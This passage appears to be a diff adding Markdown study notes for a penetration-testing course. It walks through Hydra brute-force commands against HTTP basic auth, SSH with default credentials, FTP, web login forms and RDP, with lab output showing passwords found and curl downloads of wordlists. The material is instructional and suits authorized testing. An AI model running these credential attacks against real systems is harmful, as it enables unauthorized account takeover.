@@ -272,3 +272,251 @@ Where:
 | `-v` or `-V`           |             |               |
 | `service://server`     |             |               |
 | `/OPT`                 |             |               |
+## Hydra Services
+Hydra services enable Hydra to interact with different authentication mechanisms used by various systems, applications, and network services. Each module is designed to understand a particular protocol's communication patterns and authentication requirements, allowing Hydra to send appropriate login requests and interpret the responses. Below is a table of commonly used services:
+![[S1MQhi0VJe.png]]
+## Brute-Forcing HTTP Authentication
+```bash
+$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
+```
+This command instructs Hydra to:
+1. Use the list of usernames from the `usernames.txt` file.
+2. Use the list of passwords from the `passwords.txt` file.
+3. Target the website `www.example.com`.
+4. Employ the **http-get** module to test the **HTTP authentication**.
+
+Hydra will systematically try each username-password combination against the target website to discover a valid login.
+## Targeting Multiple SSH Servers
+Consider a situation where you have several SSH servers. You compile their **IP addresses** into a file named `targets.txt` and know that these servers might use the default username "**root**" and password "**toor**". To efficiently test all these servers simultaneously, use the following Hydra command:
+```bash
+$ hydra -l root -p toor -M targets.txt ssh
+```
+This command instructs Hydra to:
+1. Use the username "root".
+2. Use the password "toor".
+3. Target all IP addresses listed in the `targets.txt` file.
+4. Employ the **ssh** module for the attack
+
+## Testing FTP Credentials on a Non-Standard Port
+Imagine you need to assess the security of an **FTP** server hosted at ``ftp.example.com``, which operates on a non-standard port `2121`. 
+
+You have lists of potential usernames and passwords stored in ``usernames.txt`` and ``passwords.txt``, respectively. To test these credentials against the **FTP** service, use the following Hydra command:
+```bash
+$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
+```
+This command instructs Hydra to:
+1. Use the list of usernames from the ``usernames.txt`` file.
+2. Use the list of passwords from the ``passwords.txt`` file.
+3. Target the **FTP** service on ``ftp.example.com`` via port **2121**.
+4. Use the **ftp** module and provide verbose output (**-V**) for detailed monitoring.
+
+Here Hydra will attempt to match each username-password combination against the FTP server on the specified port.
+
+## Brute-Forcing a Web Login Form (HTTP/S)
+Suppose you are tasked with brute-forcing a **login form** on a web app at www.example.com. You know the username is "**admin**", and the **form parameters** for the login are `user=^USER^&pass=^PASS^`. To perform this attack, use the following Hydra command:
+```bash
+$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
+```
+Where:
+1. Use the username "admin".
+2. Use the list of passwords from the `passwords.txt` file.
+3. Target the login form at `/login` on `www.example.com`.
+4. Employ the `http-post-form` module with the specified form parameters.
+5. Look for a successful login indicated by the **HTTP status code 302**.
+
+Hydra will systematically attempt each password for the "admin" account, checking for the specified success condition.
+
+## Advanced RDP Brute-Forcing
+Suppose you're testing a **Remote Desktop Protocol** (**RDP**) service on a server with IP `192.168.1.100`. You suspect the username is "**administrator**", and that the password consists of **6 to 8** characters, including **lowercase letters, uppercase letters, and numbers**. To carry out this precise attack, use the following Hydra command:
+```bash
+$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
+```
+This command instructs Hydra to:
+1. Use the username "administrator".
+2. Generate and test passwords ranging from **6 to 8** characters, using the specified character set.
+3. Target the **RDP** service on `192.168.1.100`.
+4. Employ the `rdp` module for the attack.
+
+## Basic HTTP Authentication
+### Pre-Info
+Web apps often employ **authentication mechanisms** to protect sensitive data and functionalities. **Basic HTTP Authentication**, or simply **Basic Auth**, is a rudimentary yet common method for securing resources on the web. It's easy to implement, but it's security vulnerabilities make it a frequent target for brute-force attacks.
+
+In essence, **Basic Auth** is a challenge-response protocol where a web server demands user credentials before granting access to protected resources. 
+The process begins with a user attempting to access a restricted area. The server responds with a **401 Unauthorized** status and a WWW-Authenticate header prompting the user's browser to present a login dialog.
+
+Once the user provides their **username** and **password**, the browser concatenates them into **a single string**, separated by a **colon**. This string is then encoded using **Base64** and included in the **Authorization header** of subsequent requests, following the format `Basic <encoded_credentials>`. The server decodes the credentials, verifies them against its database, and grants or denies access accordingly.
+
+For example, the headers for Basic Auth in a **HTTP GET** request would look like:
+```http
+GET /protected_resource HTTP/1.1
+Host: www.example.com
+Authorization: Basic YWxpY2U6c2VjcmV0MTIz
+```
+### Exploiting Basic Auth with Hydra
+We will use the ``http-get`` hydra service to brute force the basic auth target.
+
+In this scenario, the spawned target instance employs **Basic HTTP Authentication**. We already know the username is ``basic-auth-user``. Since we know the username, we can simplify the **Hydra** command and focus solely on brute-forcing the **password**. Here's the command we'll use:
+```bash
+# Download wordlist if needed, via:
+$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt
+
+# Hydra command
+$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
+
+...
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-09 16:04:31
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
+[DATA] attacking http-get://127.0.0.1:81/
+[81][http-get] host: 127.0.0.1   login: basic-auth-user   password: ...
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-09 16:04:32
+```
+Let's break down the command:
+
+* ``-l basic-auth-user``: Specifies that the username for the login attempt is `basic-auth-user`.
+* `-P 2023-200_most_used_passwords.txt`: This indicates that Hydra should use the password list contained in the file `2023-200_most_used_passwords.txt` for its brute-force attack.
+* ``127.0.0.1``: This is the **target IP** address, in this case, the local machine (localhost).
+* ``http-get /``: This tells Hydra that the target service is an **HTTP** server and the attack should be performed using **HTTP GET** requests to the root path (**'/'**).
+* `-s 81`: This overrides the default port for the **HTTP** service and sets it to **81**.
+
+Hydra will attempt each password from the `2023-200_most_used_passwords.txt` file against the specified resource. Eventually it will return the correct password for `basic-auth-user`, which you can use to login to the website.
+
+### Login Forms
+Beyond **Basic HTTP Auth**, many web apps employ **custom login forms** as their primary authentication mechanism. These forms, while visually diverse, often share common underlying mechanics that make them targets for brute forcing.
+#### Login Form Info / Understanding Login Forms
+While login forms may appear as simple boxes soliciting your username and password, they represent a complex interplay of **client-side** and **server-side** technologies. 
+At their core, login forms are essentially **HTML forms** embedded within a webpage. These forms typically include:
+1. Input fields (`<input>`): for capturing the username and password
+2. A submit button (`<button>` or `<input type="submit">`): to initiate the authentication process.
+##### A Basic Login Form Example
+```html
+<form action="/login" method="post">
+  <label for="username">Username:</label>
+  <input type="text" id="username" name="username"><br><br>
+  <label for="password">Password:</label>
+  <input type="password" id="password" name="password"><br><br>
+  <input type="submit" value="Submit">
+</form>
+```
+When submitted, this form sends a **POST** request to the `/login` endpoint on the server, including the entered **username** and **password** as form data:
+```http
+POST /login HTTP/1.1
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+username=john&password=secret123
+```
+* The ``POST`` method indicates that data is being sent to the server to create or update a resource.
+* ``/login`` is the **URL endpoint** handling the login request.
+* The ``Content-Type`` header specifies how the data is encoded in the request body.
+* The ``Content-Length`` header indicates the size of the data being sent.
+* The ``request body`` contains the **username** and **password**, encoded as key-value pairs.
+
+When a user interacts with a login form, the browser captures the entered credentials, often employing JavaScript for client-side validation or input sanitization.
+Upon submission, the browser constructs an **HTTP POST** request. This request encapsulates the form data—including the **username** and **password**—within its body, often encoded as ``application/x-www-form-urlencoded`` or ``multipart/form-data``.
+### http-post-form
+Hydra's ``http-post-form`` service is **specifically designed to target login forms**. It enables the automation of **POST** requests, dynamically inserting **username** and **password** combinations into the request body.
+
+The general structure of a Hydra command using ``http-post-form`` looks like this:
+```bash
+$ hydra [options] target http-post-form "path:params:condition_string"
+```
+#### Understanding the Condition String
+In **Hydra**’s ``http-post-form`` module, success and failure conditions are crucial for properly identifying **valid and invalid login attempts**. Hydra primarily relies on failure conditions (``F=...``) to determine when a login attempt has failed, but you can also specify a success condition (``S=...``) to indicate when a login is successful.
+
+The failure condition (``F=...``) is used to check for a specific string in the server's response that signals a failed login attempt. This is the most common approach because many websites return an error message (i.e "``Invalid username or password``") when the login fails.
+
+**For example**:
+If a login form returns the message "``Invalid credentials``" on a failed attempt, you can configure Hydra like this:
+```bash
+hydra ..SNIP.. http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
+```
+In this case, Hydra will check each response for the string "``Invalid credentials.``" If it finds this phrase, it will mark the login attempt as a failure and move on to the next username/password pair.
+
+However, sometimes you may not have a clear failure message but instead have a distinct success condition. For instance, if the application redirects the user after a successful login (using **HTTP** status code **302**), or displays specific content (like "**Dashboard**" or "**Welcome**"), you can configure **Hydra** to look for that success condition using ``S=``. Here’s an example where a successful login results in a **302** redirect:
+```bash
+hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
+```
+In this case, Hydra will treat any response that returns an **HTTP 302** status code as a successful login.
+
+Similarly, if a successful login results in content like "**Dashboard**" appearing on the page, you can configure Hydra to look for that keyword as a success condition:
+```bash     
+hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
+```
+Hydra will now register the login as successful if it finds the word "**Dashboard**" in the server’s response.
+#### Manual Inspection
+Upon accessing the ``IP:PORT`` in your browser, a basic login form is presented. Using your browser's developer tools, you can view the underlying **HTML code** for this form. Let's break down its key components:
+```html
+<form method="POST">
+    <h2>Login</h2>
+    <label for="username">Username:</label>
+    <input type="text" id="username" name="username">
+    <label for="password">Password:</label>
+    <input type="password" id="password" name="password">
+    <input type="submit" value="Login">
+</form>
+```
+The **HTML** reveals a simple login form. 
+**Key points for Hydra:**
+* **Method:** POST - Hydra will need to send **POST** requests to the server.
+* **Fields**:
+    * **Username**: The input field named **username** will be targeted.
+    * **Password**: The input field named **password** will be targeted.
+
+With these details, **you can construct the Hydra command** to automate the brute-force attack against this login form.
+
+##### Browser Developer Tools
+After inspecting the form, open your browser's Developer Tools (``F12``) and navigate to the ``Network`` tab. Then, **submit a sample login attempt with any credentials**.
+This will allow you to see the **POST** request sent to the server. In the ``Network`` tab, find the request corresponding to the form submission and check the **form data, headers**, and **the server’s response**.
+![[By_X-kkryg.png]]
+This information solidifies the information we will need for **Hydra**. We now have definitive confirmation of both the target path (``/``) and the parameter names (``username`` and ``password``).
+##### Proxy Interception
+For more complex scenarios, **intercepting the network traffic with a proxy tool like Burp Suite can be invaluable**. The proxy will capture the **POST** request, allowing you to dissect its every component, including the precise login parameters and their values.
+##### Constructing the params String for Hydra
+After analyzing the login form's structure and behavior, it's time to build the **params string**, a critical component of Hydra's ``http-post-form`` attack module. 
+This string encapsulates the data that will be sent to the server with each login attempt, mimicking a legitimate form submission.
+
+The params string consists of **key-value pairs**, similar to how data is encoded in a **POST** request. Each pair represents a field in the login form, with its corresponding value:
+
+* **Form Parameters:** These are the essential fields that hold the **username** and **password**. **Hydra** will dynamically replace placeholders (``^USER^`` and ``^PASS^) within these parameters with values from your wordlists.
+
+* **Additional Fields:** If the form includes other hidden fields or tokens (e.g., **CSRF tokens**), **they must also be included in the params string**. These can have static values or dynamic placeholders if their values change with each request.
+
+* **Success Condition:** This defines the criteria **Hydra** will use to identify a successful login. It can be an **HTTP** status code (like ``S=302`` for a redirect) or the presence or absence of specific text in the server's response (e.g., ``F=Invalid credentials`` or ``S=Welcome``).
+
+Let's apply this to our scenario. We've discovered:
+* The form submits data to the root path (``/``).
+* The username field is named **username**.
+* The password field is named **password**.
+* An error message "``Invalid credentials``" is displayed upon failed login.
+Therefore, our **params** string would be:
+```bash
+/:username=^USER^&password=^PASS^:F=Invalid credentials
+```
+**Where:**
+* "`/`": The path where the form is submitted.
+* `username=^USER^&password=^PASS^`: The form parameters with placeholders for Hydra.
+* `F=Invalid credentials`: The failure condition – Hydra will consider a login attempt unsuccessful if it sees this string in the response.
+
+Hydra will systematically substitute ``^USER^`` and ``^PASS^`` with values from your wordlists, sending **POST** requests to the target and analysing the responses for the specified failure condition. If a login attempt doesn't trigger the "``Invalid credentials``" message, Hydra will flag it as a potential success, revealing the valid credentials.
+```bash
+# Download wordlists if needed
+$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
+$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt
+
+# Hydra command
+$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+
+...SNIP...
+[DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:F=Invalid credentials
+[5000][http-post-form] host: IP   login: ...   password: ...
+[STATUS] attack finished for IP (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 12:51:28
+```
+**Remember that crafting the correct `params` string is crucial for a successful Hydra attack**. 
+# Medusa
+Medusa's designed to be a **fast**, massively **parallel**, and **modular** login **brute-forcer**. Its primary objective is to support a wide array of services that allow remote authentication.
